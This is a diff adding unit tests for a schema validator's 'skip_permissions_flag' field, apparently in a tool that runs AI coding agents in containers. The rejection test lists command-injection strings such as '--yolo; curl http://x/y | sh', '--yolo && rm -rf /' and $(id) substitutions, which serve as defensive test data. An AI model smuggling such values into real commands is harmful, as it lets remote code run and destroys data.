@@ -14,6 +14,7 @@ import {
   validateWorkspace,
   validateContainerProfile,
 } from './validators.js';
+import { KNOWN_AGENTS } from './agents.js';
 
 const baseProfile = {
   description: 'test',
@@ -1039,6 +1040,69 @@ describe('AgentDefinitionFileSchema', () => {
     expect(parsed.issues?.[0]?.message).toBe(
       'Agent native install "bin_dir" must also appear in "persist_dirs", '
       + 'or the install is lost on every fresh container.',
+    );
+  });
+
+  // The built-in table is a compile-time constant the schema never parses, so
+  // only this test keeps the two in step: whatever a built-in declares, a user
+  // definition must be able to declare too.
+  test('accepts every built-in skip-permissions flag', () => {
+    const flags = KNOWN_AGENTS.flatMap((agent) =>
+      agent.skip_permissions_flag === undefined ? [] : [agent.skip_permissions_flag],
+    );
+
+    // Guards the loop below against a silently empty list.
+    expect(flags.length).toBeGreaterThanOrEqual(3);
+    for (const flag of flags) {
+      expect(v.safeParse(AgentDefinitionFileSchema, { ...minimalDefinition, skip_permissions_flag: flag }).success)
+        .toBe(true);
+    }
+  });
+
+  // The wrapper interpolates the value unquoted, so word splitting is the point:
+  // an agent may need a flag plus its value, or two flags.
+  test('accepts a multi-token skip_permissions_flag', () => {
+    for (const flag of ['--sandbox danger-full-access', '--yolo --force', '-y']) {
+      expect(v.safeParse(AgentDefinitionFileSchema, { ...minimalDefinition, skip_permissions_flag: flag }).success)
+        .toBe(true);
+    }
+  });
+
+  test('rejects a skip_permissions_flag that is not flag-shaped', () => {
+    const rejected = [
+      '--yolo; curl http://x/y | sh',
+      '--yolo && rm -rf /',
+      '--yolo $(id)',
+      '--yolo `id`',
+      '--yolo > /tmp/x',
+      "--yolo 'x'",
+      '--yolo "x"',
+      '--yolo \\',
+      '--yolo\nrm -rf /',
+      'yolo',
+      '--',
+      '  ',
+      '',
+    ];
+
+    for (const flag of rejected) {
+      expect(v.safeParse(AgentDefinitionFileSchema, { ...minimalDefinition, skip_permissions_flag: flag }).success)
+        .toBe(false);
+    }
+  });
+
+  // Hand-written literal, not the imported message, so a wording regression
+  // fails here.
+  test('names the flag rule when a shell command is appended', () => {
+    const parsed = v.safeParse(AgentDefinitionFileSchema, {
+      ...minimalDefinition,
+      skip_permissions_flag: '--yolo; curl http://x/y | sh',
+    });
+    expect(parsed.success).toBe(false);
+    expect(parsed.issues?.[0]?.message).toBe(
+      'Agent "skip_permissions_flag" must be a flag (starting with "-") optionally followed by '
+      + 'space-separated tokens (e.g. "--yolo", "--sandbox danger-full-access"), using only '
+      + 'letters, digits and ". _ - = : , /".',
     );
   });
 
